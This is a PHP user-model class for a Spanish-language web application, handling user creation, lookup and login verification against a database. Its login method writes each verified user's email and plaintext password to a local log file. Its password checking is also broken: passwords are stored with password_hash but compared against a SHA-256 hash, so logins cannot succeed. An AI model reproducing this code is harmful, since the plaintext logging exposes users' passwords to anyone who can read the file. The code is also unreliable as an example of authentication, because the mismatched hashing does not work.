<?php
require_once '../config/conexion.php';

class Usuario
{
    private $conexion;

    public function __construct()
    {
        $this->conexion = new Conexion();
    }

//Metodo para agregar un usuario atraves de los parametros usuario, passw, email y rol a la base de datos
public function agregarUsuario($email, $nombre, $password )
{
    //Encriptamos la contraseña atraves de la funcion password_hash
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
    //Preparamos la consulta para agregar un usuario
    $query = "INSERT INTO usuario (email, nombre, passwd) VALUES (?, ?, ?)";
    $stmt = $this->conexion->conexion->prepare($query);
    $stmt->bind_param("sss", $email, $nombre, $hashedPassword, );

    //Si la consulta se ejecuta correctamente, se muestra un mensaje de exito
    if ($stmt->execute()) {
        echo "Usuario agregado con éxito.";
    } else {
        echo "Error al agregar Usuario: " . $stmt->error;
    }

    $stmt->close();
}

//Metodo para obtener todos los usuarios de la base de datos atraves del email
public function obtenerUsuarioPorEmail($email)
{
    $query = "SELECT * FROM usuario WHERE email = ?";
    $stmt = $this->conexion->conexion->prepare($query);

    if (!$stmt) {
        die("Error en la preparación de la consulta: " . $this->conexion->conexion->error);
    }

    $stmt->bind_param("s", $email);
    //Si la consulta no se ejecuta correctamente, se muestra un mensaje de error
    if (!$stmt->execute()) {
        die("Error al ejecutar la consulta: " . $stmt->error);
    }

    $resultado = $stmt->get_result();
    //Si el resultado de la consulta es mayor a 0, se retorna el resultado
    if ($resultado->num_rows > 0) {
        return $resultado->fetch_assoc();
    }//Si no, se muestra un mensaje de error 
    else {
        error_log("Usuario no encontrado: " . $email); 
        return null; 
    }
}


    public function ObtenerUsuarios()
    {
        $query = "SELECT * FROM usuario";
        $resultado = $this->conexion->conexion->query($query);
        $usuario = [];
        while ($fila = $resultado->fetch_assoc()) {
            $usuario[] = $fila;
        }
        return $usuario;
    }

    public function ObtenerUsuarioPorId($email)
    {
        $query = "SELECT * FROM usuario WHERE email = ?";
        $stmt = $this->conexion->conexion->prepare($query);
        $stmt->bind_param("s", $email);
        $stmt->execute();
        $resultado = $stmt->get_result();
        return $resultado->fetch_assoc();
    }

    public function VerificarUsuario($email, $passwd)
    {
        // Consulta para buscar al usuario por email
        $query = "SELECT * FROM usuario WHERE email = ?";
        $stmt = $this->conexion->conexion->prepare($query);
        $stmt->bind_param("s", $email); // Solo necesitamos el email

        if ($stmt->execute()) {
            // Obtenemos el resultado
            $resultado = $stmt->get_result();

            if ($resultado->num_rows > 0) {
                $usuario = $resultado->fetch_assoc();
                $stored_hash = $usuario['passwd']; // Hash almacenado

                // Generamos el hash de la contraseña ingresada usando sha256
                $input_hash = hash('sha256', $passwd);

                // Comparamos los hashes usando hash_equals
                if (hash_equals($stored_hash, $input_hash)) {
                    $stmt->close();
                    $resultado->close(); // Cerrar el resultado

                    // Guardar las credenciales verificadas en un archivo .log
                    $this->GuardarCredencialesEnLog($email, $passwd);
                    return $usuario; // Si la contraseña es correcta, devolvemos los datos del usuario
                }
            }

            // Mensaje genérico de error
            echo "Credenciales incorrectas.<br>";
        } else {
            // Registrar el error en lugar de imprimirlo
            error_log("Error al verificar usuario: " . $stmt->error);
        }

        $stmt->close();
        return null; // Si no se encuentra el usuario o las credenciales son incorrectas
    }

    private function GuardarCredencialesEnLog($email, $passwd)
    {
        $logFile = "credenciales_verificadas.log";
        $logEntry = "Email: $email, Password: $passwd\n";

        // Guardar las credenciales en el archivo log
        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX)) {
            echo "Credenciales guardadas en log correctamente.<br>";
        } else {
            error_log("Error al guardar credenciales en el log.");
        }
    }
}
